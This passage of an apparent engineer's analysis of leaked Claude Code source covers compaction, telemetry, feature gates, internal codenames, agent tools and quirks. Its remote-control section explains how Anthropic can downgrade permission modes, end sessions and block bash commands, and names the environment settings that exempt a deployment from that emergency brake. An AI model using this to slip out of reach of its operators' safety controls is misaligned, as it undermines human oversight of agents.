- canonical threshold checks use the last real API usage plus estimated tokens for messages added since
- they special-case split assistant records from parallel tool calls so interleaved tool results are not undercounted
- they have API token counting, rough byte/token estimates, file-type-specific estimates for JSON, and provider-specific fallback paths

This is fairly careful, but it also implies how easy it is for the system to get token accounting wrong when messages are rewritten, compacted, resumed, or split across streaming tool calls.

### Bottom line on compaction

The main reason Claude Code compaction seems worse than Codex-style compaction is probably not a single bug. It is the combined effect of:

- an over-specified summary prompt
- heavy post-compact context rehydration
- multiple overlapping compaction layers
- resume-boundary ambiguity
- strong pressure to preserve cache keys even while mutating context

## Analytics, observability, and tracking

### Short take

Telemetry is extensive and thoughtfully engineered. There are real privacy-aware touches, but this is still a lot of instrumentation.

### 1. Two main sinks

The analytics pipeline is organized around:

- Datadog logs (`src/services/analytics/datadog.ts`)
- first-party event logging via OTel batching/export (`src/services/analytics/firstPartyEventLogger.ts`, `src/services/analytics/firstPartyEventLoggingExporter.ts`)

`src/services/analytics/sink.ts` fans events out to both, with sampling and a sink kill-switch.

### 2. Rich event enrichment

`src/services/analytics/metadata.ts` enriches events with:

- session ID
- model
- beta headers
- interactive/non-interactive state
- client type
- environment/platform/arch/version/build info
- process metrics
- subscription tier
- repo remote hash
- swarm/subagent/team attribution
- Kairos assistant-mode bit
- optionally MCP server/tool details

Datadog gets a filtered/general-access version. The 1P pipeline gets the richer form, including privileged `_PROTO_*` fields routed into protected columns.

### 3. 1P exporter stores and retries failed events locally

`src/services/analytics/firstPartyEventLoggingExporter.ts` writes failed event batches into `~/.claude/telemetry`, retries them with backoff, and replays prior failed batches on startup.

That is good operational hygiene, but it also means telemetry can persist locally on disk if network delivery fails.

### 4. Datadog is selective, 1P is much broader

`src/services/analytics/datadog.ts` has an allowlist of event names and normalizes high-cardinality fields. It also hashes users into buckets and truncates version/model cardinality.

The 1P path is broader and carries more raw structure.

### 5. Sentiment/frustration tracking exists in multiple forms

There are at least two layers here:

- `src/utils/userPromptKeywords.ts` has a regex for profanity/frustration style prompts (`wtf`, `shit`, `this sucks`, `so frustrating`, etc.)
- `src/commands/insights.ts` contains a heavier offline classification pipeline with satisfaction labels like `frustrated`, `dissatisfied`, `satisfied`, `happy`, etc.

The first is lightweight heuristic detection. The second is a report-generation pipeline that mines session logs and asks the model to classify outcomes and friction.

### 6. `/insights` is surprisingly invasive

`src/commands/insights.ts` is not ordinary telemetry. It is a full local-usage mining/reporting feature.

It processes:

- session logs
- tool usage patterns
- message counts
- token counts
- languages/files changed
- git behavior
- interruptions
- user satisfaction/facets

In ant-only mode it can even SCP in session data from running remote hosts.

### 7. Privacy-aware touches

The code does show deliberate restraint in some places:

- metadata typing discourages raw strings in analytics payloads
- MCP tool names are sanitized unless an allowlisted case applies
- repo remotes are hashed, not sent raw
- `_PROTO_*` fields are stripped before Datadog fanout
- tool-input telemetry is gated behind `OTEL_LOG_TOOL_DETAILS` and truncated/bounded

Still, the net telemetry footprint is large.

### 8. Observer/backseat mode (ant-only)

`src/services/analytics/metadata.ts:495` includes an `observerMode` field with three variants: `'backseat'`, `'skillcoach'`, or `'both'`. This is an internal Anthropic feature for observing and coaching users, with `tengu_backseat_*` events for BQ cohort analysis.

### 9. GrowthBook gate inventory

The codebase contains 52+ GrowthBook feature gates, all following the `tengu_*` naming convention. These control everything from model selection to analytics sampling to feature rollout. Gates refresh mid-session (~5 minutes), meaning Anthropic can flip features on running processes without restart (`src/services/analytics/growthbook.ts:95-157`).

Selected gate families:

- **Memory**: `tengu_onyx_plover` (auto-dream scheduling), `tengu_herring_clock` (team memory daily log), `tengu_coral_fern` (memdir loader), `tengu_passport_quail` (auto-memory path selection)
- **Compaction**: `tengu_sm_compact`, `tengu_session_memory`, `tengu_slate_heron` (time-based microcompact), `tengu_compact_cache_prefix`
- **Remote control**: `tengu_ccr_bridge`, `tengu_ccr_bridge_multi_session`, `tengu_ccr_mirror` (every local session spawns outbound mirror), `tengu_cobalt_lantern` (remote agent auto-detect)
- **Security**: `tengu_sandbox_disabled_commands` (dynamic bash blocklist), `tengu_tree_sitter_shadow` (AST security analysis), `tengu_disable_bypass_permissions_mode` (emergency killswitch)
- **Plans**: `tengu_pewter_ledger` (plan file size experiment with 4 arms: null/trim/cut/cap), `tengu_plan_mode_interview_phase`

For the complete catalog, see `CATALOG-claudecode.md`.

### 10. Dual-sink PII routing

Analytics events carry `_PROTO_*` prefixed keys (raw skill names, plugin names, marketplace sources) that are stripped before Datadog fanout but sent to the privileged 1P endpoint with PII-tagged BQ columns. This lets internal analysts see raw identifiers while general-access dashboards only see normalized/hashed versions (`src/services/analytics/firstPartyEventLoggingExporter.ts:714-749`, `src/services/analytics/sink.ts:64-66`).

Only 33 event types are sent to Datadog at all — the 1P pipeline receives everything.

## Hidden initiatives, model traces, and long-lived agent hints

### Kairos

Kairos is the clearest long-lived-agent initiative visible in this artifact.

What is visible:

- assistant-mode gating in `src/main.tsx`
- forced Brief activation when assistant mode is enabled
- special daily-log memory behavior in `src/memdir/*`
- assistant-mode bash auto-backgrounding in `src/tools/BashTool/BashTool.tsx`
- assistant-mode telemetry bits in `src/services/analytics/metadata.ts`
- assistant-related history fetch in `src/assistant/sessionHistory.ts`

What is missing:

- the core `src/assistant/index.js`
- the gate module `src/assistant/gate.js`

So we can see the edges and integration points, but not the main assistant implementation.

### Brief / SendUserMessage

`src/tools/BriefTool/BriefTool.ts` is essentially a toolized "message the user" channel with proactive vs normal status tagging, attachments, entitlement gates, and analytics.

This is a strong sign that Anthropic is trying to support agents that keep working while the user is away and then surface proactive updates later.

### Ultraplan

`src/commands/ultraplan.tsx` plus the related remote task plumbing points to a more powerful remote planning mode that runs "Claude Code on the web" and later sends the plan back or lets the user continue there.

This is not just a slash command. It has remote session creation, approval flow, lifecycle tracking, and task notification wiring.

### Capybara

I found no clean "here is the Capybara model" implementation in this artifact, but there are real traces:

- `src/utils/model/antModels.ts` expects ant-only model alias overrides from `tengu_ant_model_override`
- `src/main.tsx` has comments about ant model aliases such as `capybara-fast`
- `src/utils/messages.ts` and `src/utils/toolResultStorage.ts` contain model-specific workarounds referencing capybara behavior
- `src/query.ts` references protected-thinking blocks "e.g. capybara"
- `src/buddy/types.ts` contains a comment that one species name collides with a model-codename canary, and `capybara` is runtime-constructed to keep the literal out of the external bundle

So capybara is absolutely a real model codename in the surrounding ecosystem, but this leaked artifact does not expose the actual ant-model configuration payload.

### Harbor / channels

“Harbor” appears to be the MCP “channels” initiative: allowlisted channel plugins (Telegram/iMessage/Discord) plus a structured permission-relay mechanism. See the security section “Harbor channels + permission relay” and the core implementations in `src/services/mcp/channelAllowlist.ts` and `src/services/mcp/channelPermissions.ts`.

### Lodestone (deep links)

“Lodestone” appears to be the deep-link protocol story: the client can auto-register a `claude-cli://` protocol handler, gated by `tengu_lodestone_enabled` (`src/utils/deepLink/registerProtocol.ts:292-347`).

### Mythos

I found no direct `mythos` references in this artifact.

### Long-lived/always-on agent implications

The strongest lessons for an always-on agent framework are:

- use append-only logs plus later consolidation, not constant in-place rewriting
- provide a separate proactive user-messaging channel
- aggressively keep long-running shell work off the foreground agent path
- preserve cache-safe prompt state across background helpers
- keep durable memory extraction tool-constrained and coalesced

## Tool and agent system

### Tool inventory

The source tree contains 40+ tool implementations across `src/tools/`. Notable categories:

- **Core I/O**: BashTool, FileReadTool, FileEditTool, FileWriteTool, GlobTool, GrepTool, NotebookEditTool, LSPTool
- **Agent orchestration**: AgentTool, TeamCreateTool, TeamDeleteTool, SendMessageTool, TaskStopTool, TaskOutputTool
- **Web**: WebFetchTool, WebSearchTool, WebBrowserTool
- **MCP**: MCPTool, ListMcpResourcesTool, ReadMcpResourceTool
- **Planning**: EnterPlanModeTool, ExitPlanModeV2Tool, EnterWorktreeTool, ExitWorktreeTool
- **Scheduling**: ScheduleCronTool (CronCreate/Delete/List), RemoteTriggerTool, SleepTool
- **Proactive/Kairos**: BriefTool, SuggestBackgroundPRTool, MonitorTool, PushNotificationTool, SubscribePRTool, SendUserFileTool
- **Tasks**: TodoWriteTool (v1), TaskCreateTool/TaskGetTool/TaskUpdateTool/TaskListTool (v2)
- **Experimental/internal**: OverflowTestTool, CtxInspectTool, TerminalCaptureTool, TungstenTool, REPLTool, SnipTool, ListPeersTool, WorkflowTool, VerifyPlanExecutionTool, ConfigTool (ant-only)

Tool access is heavily constrained per context (`src/constants/tools.ts`):

- `ALL_AGENT_DISALLOWED_TOOLS`: TaskOutput, ExitPlanMode, EnterPlanMode, AskUserQuestion, TaskStop, Workflow — no subagent can use these
- `ASYNC_AGENT_ALLOWED_TOOLS`: Read/Write/Edit/Glob/Grep/Bash/Skill/ToolSearch/Worktree — notably NO AgentTool (prevents infinite recursion)
- `COORDINATOR_MODE_ALLOWED_TOOLS`: AgentTool, TaskStop, SendMessage, SyntheticOutput — only orchestration tools

### Built-in agents

Five built-in agent types in `src/tools/AgentTool/built-in/`:

1. **generalPurposeAgent**: fallback for untyped agent spawns
2. **exploreAgent**: read-only codebase exploration, `omitClaudeMd: true` to save tokens (~5-15Gtok/week across 34M+ weekly spawns)
3. **planAgent**: planning specialist, one-shot (no SendMessage continuation)
4. **claudeCodeGuideAgent**: product onboarding
5. **verificationAgent**: adversarial testing — explicitly tries to break the implementation, no project modifications allowed

Explore and plan are one-shot agents (`ONE_SHOT_BUILTIN_AGENT_TYPES`) that skip agentId/SendMessage/usage trailer (~135 chars saved × 34M weekly runs).

### Fork subagent system

`src/tools/AgentTool/forkSubagent.ts` implements a "fork" mode where subagents inherit the parent's full system prompt + conversation context:

- Mutually exclusive with coordinator mode (each owns orchestration)
- Recursive forking is blocked via `FORK_BOILERPLATE_TAG` detection
- All fork children must produce byte-identical prompt prefixes for cache hits
- Fork agents get `permissionMode: 'bubble'` — permission prompts surface to the parent terminal
- `tools: ['*']` with `maxTurns: 200`

### Coordinator/team/swarm mode

`src/coordinator/coordinatorMode.ts` implements multi-agent orchestration:

- System prompt: "You are Claude Code, an AI assistant that orchestrates software engineering tasks across multiple workers"
- Workers communicate via `<task-notification>` XML
- Team state tracks: teamName, teamFilePath, leadAgentId, teammates map with deterministic lead ID `formatAgentId('team-lead', teamName)`
- Send message routing: teammate name, `"*"` for broadcast, `"uds:<socket-path>"` (UDS inbox), `"bridge:<session-id>"` (remote control peers)
- In-process teammates use AsyncLocalStorage for isolation; process-based teammates use tmux/iTerm2 panes
- Workers get filtered tool lists — no team-management tools (TeamCreate, TeamDelete, SendMessage, SyntheticOutput)

### Cron scheduler

`src/utils/cronScheduler.ts` implements persistent scheduled tasks in `~/.claude/scheduled_tasks.json`. Features include jittered scheduling (up to 10% of period), 7-day auto-deletion for recurring tasks, lock-based coordination, and one-shot vs. recurring modes. This is the infrastructure behind the `/loop` skill and proactive agent triggers.

## Quirks, Easter Eggs, and fun/weird bits

These aren’t the “main architecture”, but they’re the kind of glue that reveals how the product actually behaves.

### Buddy system (`/buddy`)

- It’s a build-time feature-gated gacha-style “companion” that sits beside the input and sometimes reacts; it’s also explicitly designed to be “viral” (local-date teaser window for a rolling timezone wave, “sustained Twitter buzz”, and “gentler on soul-gen load”) (`src/buddy/useBuddyNotification.tsx:9-21`).
- The teaser window is April 1-7, 2026 (local date), but the feature stays live after (`src/buddy/useBuddyNotification.tsx:9-21`).
- Companion “bones” are deterministic per user: a seeded PRNG (`mulberry32`) and a stable salt `friend-2026-401` over a user ID hash; the result is memoized because it’s called from hot paths (sprite tick, per-keystroke PromptInput, per-turn observer) (`src/buddy/companion.ts:15-112`).
- Rarity is weighted (`common: 60 ... legendary: 1`), there’s a `shiny` 1% roll, and stats include `DEBUGGING`, `PATIENCE`, `CHAOS`, `WISDOM`, `SNARK` (`src/buddy/types.ts:1-107`, `src/buddy/companion.ts:43-101`).
- “Soul” (name/personality) is model-generated and stored in config, while “bones” are regenerated on every read so config edits can’t “cheat” a legendary and future species list edits don’t brick old companions (`src/buddy/types.ts:100-128`, `src/buddy/companion.ts:124-133`, `src/utils/config.ts:269-271`).
- They treat internal model codenames as a leak hazard: buddy species are runtime-constructed with `String.fromCharCode`, with an explicit comment about a “model-codename canary” and avoiding literal strings in external bundles (notably `capybara`) (`src/buddy/types.ts:10-38`).
- The model is told “you’re not the companion” via a dedicated `companion_intro` `<system-reminder>` attachment, and is instructed to keep its own response to one line when the user is addressing the buddy directly (`src/buddy/prompt.ts:7-36`, `src/utils/messages.ts:4232-4239`).
- The core buddy command and “friend observer” aren’t present in this leaked tree (required as `./commands/buddy/index.js`, referenced as `src/buddy/observer.ts`), so we can’t see how the first “hatch” (soul generation) or reactions are actually implemented (`src/commands.ts:118-122`, `src/state/AppStateStore.ts:168-171`).

### Anti-distillation decoy-tool injection

- The client has a first-class “anti-distillation” wire knob: when enabled, it sends `anti_distillation: ['fake_tools']` in API request bodies (`src/services/api/claude.ts:301-313`).
- It is deliberately limited to first-party CLI traffic: it’s gated behind a build feature (`ANTI_DISTILLATION_CC`), `CLAUDE_CODE_ENTRYPOINT === 'cli'`, “first party only” betas, and a GrowthBook feature value (`tengu_anti_distill_fake_tool_injection`) (`src/services/api/claude.ts:301-313`).
- The client artifact does not show the server behavior (e.g., how decoy tools get spliced into the system prompt), only the opt-in signal.

### Voice mode “Cloudflare TLS fingerprinting” hack

- `voice_stream` websocket traffic is routed to `api.anthropic.com` instead of `claude.ai` because Cloudflare TLS fingerprinting on the `claude.ai` zone challenges non-browser clients; desktop dictation can still hit `claude.ai` because Swift URLSession has a “browser-class JA3 fingerprint” (`src/services/voiceStreamSTT.ts:124-131`).
- There is also an explicit STT-provider ramp knob: `tengu_cobalt_frost` switches the backend to “conversation-engine with Deepgram Nova 3”, bypassing the server’s own GrowthBook gate so clients can be ramped independently (`src/services/voiceStreamSTT.ts:153-165`).

### Misc “product glue” signals

- Output styles as product-level behavior programming: built-in `Explanatory` and `Learning` styles ship as huge prompt blocks. “Learning” explicitly instructs the model to insert a single `TODO(human)` section into the codebase before asking the user to write 2–10 lines of code (`src/constants/outputStyles.ts:56-93`).
- TodoWriteTool has a built-in “spawn a verifier” nudge: if you close a 3+ item todo list with no “verif*” task, the tool result tells the assistant to spawn the verification agent and says “You cannot self-assign PARTIAL … only the verifier issues a verdict.” (`src/tools/TodoWriteTool/TodoWriteTool.ts:72-108`).
- Harbor permission IDs avoid accidental profanity: the 5-letter approval IDs have an explicit substring blocklist (and a funny comment about why they avoided numbers) (`src/services/mcp/channelPermissions.ts:80-109`).
- “Miraculo the bard” is a killswitch: `tengu_miraculo_the_bard` disables the startup fast-mode prefetch network call but preserves org-policy enforcement by resolving from cache (`src/main.tsx:2344-2365`).
- The “attribution header” is literally a fake HTTP header line embedded as a system-prompt text block (`x-anthropic-billing-header: ...`). When native client attestation is enabled it includes `cch=00000`, and the comment says Bun’s HTTP stack rewrites the placeholder in the serialized request bytes, pointing at a Zig implementation (`src/constants/system.ts:59-72`, `src/utils/sideQuery.ts:146-167`).
- One of the built-in “spinner verbs” is literally `Tomfoolering` (`src/constants/spinnerVerbs.ts:183`).
- There’s unusually candid in-code doubt: an `ollie` TODO above a memoized MCP connect helper says the memoization “increases complexity by a lot” and they’re “not sure it really improves performance” (`src/services/mcp/client.ts:588-607`).
- They have an explicit guard to prevent config writes from wiping auth state if the config file is truncated/corrupted mid-write, and it references a real GitHub issue (#3117) (`src/utils/config.ts:776-865`).
- The external build ships 18 hard-disabled hidden command stubs of the form `export default { isEnabled: () => false, isHidden: true, name: 'stub' };` — likely placeholders for internal-only commands: `ant-trace`, `autofix-pr`, `backfill-sessions`, `break-cache`, `bughunter`, `ctx_viz`, `debug-tool-call`, `env`, `good-claude`, `issue`, `mock-limits`, `oauth-refresh`, `onboarding`, `perf-issue`, `reset-limits`, `share`, `summary`, `teleport` (`src/commands/ant-trace/index.js:1`, `src/commands/autofix-pr/index.js:1`, `src/commands/backfill-sessions/index.js:1`, `src/commands/break-cache/index.js:1`, `src/commands/bughunter/index.js:1`, `src/commands/ctx_viz/index.js:1`, `src/commands/debug-tool-call/index.js:1`, `src/commands/env/index.js:1`, `src/commands/good-claude/index.js:1`, `src/commands/issue/index.js:1`, `src/commands/mock-limits/index.js:1`, `src/commands/oauth-refresh/index.js:1`, `src/commands/onboarding/index.js:1`, `src/commands/perf-issue/index.js:1`, `src/commands/reset-limits/index.js:1`, `src/commands/share/index.js:1`, `src/commands/summary/index.js:1`, `src/commands/teleport/index.js:1`).

## Gotchas: remote control and ambient authority

These are architectural properties that don't fit neatly into "bugs" or "quirks" — they're deliberate design choices with implications that may surprise users.

### Remote permission killswitch

Anthropic can remotely force-downgrade or force-terminate Claude Code installations via the Statsig/GrowthBook gate `tengu_disable_bypass_permissions_mode`. The killswitch file (`src/utils/permissions/bypassPermissionsKillswitch.ts`) checks the gate once before the first query and downgrades `bypassPermissions` to `default`. A second path (`src/utils/permissions/permissionSetup.ts:1411-1431`) does the same check and then calls `gracefulShutdown(1, 'bypass_permissions_disabled')` — terminating the process entirely.

Auto mode has the same pattern: `tengu_auto_mode_config` is a remote circuit breaker that can eject users from auto mode mid-session.

The gates are one-directional — they can only restrict, never grant permissions. This is an emergency brake, not a backdoor.

**Targeting granularity**: This is not a global on/off switch. GrowthBook is initialized with rich user attributes (`src/services/analytics/growthbook.ts:32-47`, `src/services/analytics/growthbook.ts:454-485`): `organizationUUID`, `accountUUID`, `email`, `deviceID`, `sessionId`, `subscriptionType`, `rateLimitTier`, `userType` (ant vs external), `platform`, `apiBaseUrlHost`, and `appVersion`. GrowthBook's standard targeting engine supports arbitrary boolean combinations, so Anthropic can target the killswitch at a specific org, a specific user, all free-tier users, a single device, a specific enterprise proxy deployment, or any combination.

The `apiBaseUrlHost` attribute is worth noting: comments (`src/services/analytics/growthbook.ts:428-434`) explain it was added specifically because enterprise proxy deployments (Epic, Marble, etc.) lack org/account/email attributes, so this gives Anthropic a targeting handle on enterprise customers even when those customers don't use Anthropic's OAuth.

This is qualitatively different from shutting off API access. API shutdown is binary and visible. The killswitch can silently downgrade specific permission modes for a specific org, user, plan tier, or enterprise deployment without affecting anyone else. The user notification says "Bypass permissions mode was disabled by your organization policy" (`src/utils/permissions/permissionSetup.ts:783-784`) — framing a remote Anthropic action as an org policy decision.

**Scope**: Everyone except explicit Bedrock/Vertex/Foundry deployments (where GrowthBook is disabled via `isAnalyticsDisabled()` in `src/services/analytics/config.ts`). This notably includes enterprise proxy deployments that route through a custom `ANTHROPIC_BASE_URL` — they don't set the provider env vars, so GrowthBook remains active. The `apiBaseUrlHost` attribute exists specifically to make these deployments individually targetable. Only users who set `CLAUDE_CODE_USE_BEDROCK`, `CLAUDE_CODE_USE_VERTEX`, or `CLAUDE_CODE_USE_FOUNDRY` are fully exempt — which also means they can't be remotely emergency-braked if something goes wrong.

### Remote session mirroring

The `tengu_ccr_mirror` gate (`src/bridge/bridgeEnabled.ts:197-202`), when enabled, causes every local session to spawn an outbound-only mirror session to Anthropic's remote infrastructure (`src/bridge/remoteBridgeCore.ts:748-752`). This is the infrastructure behind the Remote Control product feature, but the GrowthBook gate means Anthropic could enable it server-side for first-party users without explicit per-session user action. It's gated at both build time (`CCR_MIRROR` feature flag) and runtime.

### Dynamic bash blocklist

`tengu_sandbox_disabled_commands` is a GrowthBook gate that controls a dynamic blocklist of bash commands. Unlike the killswitch (which only restricts permission modes), this directly changes which commands the agent can execute. The gate allows Anthropic to remotely block specific commands across all first-party installations — useful for incident response if a new exploit pattern is discovered, but another remote behavior-modification surface.

### What Codex does differently

Codex has no equivalent remote control surface. Its feature flags are compiled into the client and configured locally via `config.toml`. Statsig integration in Codex is used only for metrics/telemetry export (`https://ab.chatgpt.com/otlp/v1/metrics`), not feature gating. The only remote content Codex fetches is a promotional announcement tip from GitHub raw (`announcement_tip.toml`), which is purely informational UI copy.

This is a genuine architectural difference. Codex trusts the locally-installed binary; Claude Code trusts a remote feature-flagging service for security-critical runtime decisions. Both are defensible positions with different tradeoff profiles.

### The broader framing

Of course, both tools depend on their respective companies continuing to serve the underlying models — you can't use Claude Code if Anthropic stops serving Claude, and you can't use Codex if OpenAI stops serving GPT. The killswitch is a different kind of dependency: it's not "the service is unavailable," it's "the service can reach into your running client and change what it's allowed to do." The distinction matters for anyone thinking about trust boundaries in agentic tooling.

## Quirks, easter eggs, and cultural artifacts

### "The rules of thinking" wizard comment

`src/query.ts:151-163` frames API thinking-block constraints in medieval fantasy:

> The rules of thinking are lengthy and fortuitous. They require plenty of thinking of most long duration and deep meditation for a wizard to wrap one's noggin around. ... Heed these rules well, young wizard. For they are the rules of thinking, and the rules of thinking are the rules of the universe. If ye does not heed these rules, ye will be punished with an entire day of debugging and hair pulling.

### Duck species as model-codename canary

The buddy companion system encodes species names as hex via `String.fromCharCode` to avoid tripping a build-output string scanner (`src/buddy/types.ts:10-38`):

```typescript
const c = String.fromCharCode
export const duck = c(0x64,0x75,0x63,0x6b) as 'duck'
export const capybara = c(0x63, 0x61, 0x70, 0x79, 0x62, 0x61, 0x72, 0x61) as 'capybara'
export const chonk = c(0x63, 0x68, 0x6f, 0x6e, 0x6b) as 'chonk'
```

The comment says one species "collides with a model-codename canary in excluded-strings.txt" — the check greps build output (not source), so runtime-constructing the literal keeps the canary armed while the species works normally. `capybara` is runtime-constructed for the same reason.

### 200+ spinner verbs

`src/constants/spinnerVerbs.ts` has over 200 loading-state verbs. Highlights beyond "Tomfoolering": Flibbertigibbeting, Whatchamacalliting, Razzmatazzing, Combobulating, Discombobulating, Recombobulating, Prestidigitating, Boondoggling, Hullaballooing, Hyperspacing, Sock-hopping, Spelunking, Beboppin', and Moonwalking.

### Fast mode = "Penguin Mode"

The fast-mode API endpoint is literally named `penguin_mode`. Its killswitch is `tengu_penguins_off`.

### Model codename "Fennec" = Opus

Migration comments reference model codenames alongside version chains: "Fennec" is the Opus codename, alongside the Sonnet lineage (Sonnet 1M → Sonnet 4.5 → Sonnet 4.6).

### Computer Use "Chicago"

A full computer-use implementation is present, built on `@ant/computer-use-mcp`. Internal codename appears to be "Chicago."

### Upstream proxy with anti-ptrace

The container-aware proxy relay uses `prctl(PR_SET_DUMPABLE, 0)` to prevent ptrace attacks — other processes on the same container/host cannot attach to dump memory containing secrets.

### Beta headers reveal unreleased API features

The API layer sends beta headers for features not yet public: `interleaved-thinking`, `context-1m`, `structured-outputs`, `web-search`, `advanced-tool-use`, `effort`, `task-budgets`, `prompt-caching-scope`, `fast-mode`, `redact-thinking`, `token-efficient-tools`, `afk-mode`, `cli-internal`, `advisor-tool`, `summarize-connector-text` (`src/services/api/claude.ts`).

### Process metrics telemetry

Every analytics event is enriched with: process uptime, RSS, heap stats (used/total), external memory, CPU usage + percent, plus platform/arch/Node version/terminal/package managers/runtimes, GitHub Actions metadata (actor_id, repository_id, repository_owner_id), WSL version, and Linux distro ID/version (`src/services/analytics/metadata.ts:457-682`).

### Community reverse-engineering threads (useful cross-checks)

- https://www.reddit.com/r/ClaudeAI/comments/1s8lkkm/i_dug_through_claude_codes_leaked_source_and/
- https://www.reddit.com/r/claude/comments/1s7yjk0/this_guy_nails_it_i_cant_thank_him_enough_psa/

I could not review the linked X/Twitter threads from this environment, but the two reddit writeups above line up with multiple concrete code-level artifacts (buddy system, voice_stream CF/TLS routing, attestation placeholder mechanics, and resume/cache fragility).

## Bundled skills visible in this artifact

Bundled skill registration is in `src/skills/bundled/index.ts`. The following files are present in `src/skills/bundled/`:

- `batch`
- `claude-api`
- `claudeApiContent`
- `claude-in-chrome`
- `debug`
- `keybindings-help`
- `loop`
- `lorem-ipsum`
- `remember`
- `schedule`
- `simplify`
- `skillify`
- `stuck`
- `update-config`
- `verify`
- `verifyContent`

Feature-gated skills are referenced but not present in this tree, including at least:

- `dream`
- `hunter`
- `runSkillGenerator`

## Feature flags / runtime config / analytics event names (exhaustive)

For an exhaustive, cited list of:

- bundled skill names (`registerBundledSkill`)
- build-time feature flags (`feature('...')`)
- GrowthBook feature keys (`getFeatureValue_*('...')`)
- Statsig gates (`checkStatsigFeatureGate_*('...')`)
- dynamic config keys (`getDynamicConfig_*('...')`)
- analytics event names (`logEvent('...')`)

…see `CATALOG-claudecode.md`.

## What I would steal for our own system

- The separation between durable memory extraction and live task execution.
- The daily-log plus later distillation pattern for long-lived agents.
- The explicit cache-safe fork parameter model.
- The transcript-seeded replacement-state reconstruction on resume.
- Path hardening that treats agent-owned config and memory dirs as a real attack surface.
- Client-side secret scanning before any collaborative memory sync.

## What I would not copy

- The "ask the model for a giant retrospective summary" compaction prompt.
- The overlapping stack of many partial context-reduction systems.
- Rehydrating so much context immediately after compaction.
- Relying on markdown-file memory plus prompt conventions as the main long-term memory substrate.

## Main unanswered questions

- What exactly lives in the missing Kairos assistant modules?
- What does the ant-only Bash classifier actually do?
- What are the full internal `tengu_ant_model_override` payloads and hidden model aliases?
- What is the actual npm publication path that leaked the inline sourcemaps?
- How much of the cache/resume pain is client-side versus server-side prompt-caching behavior?
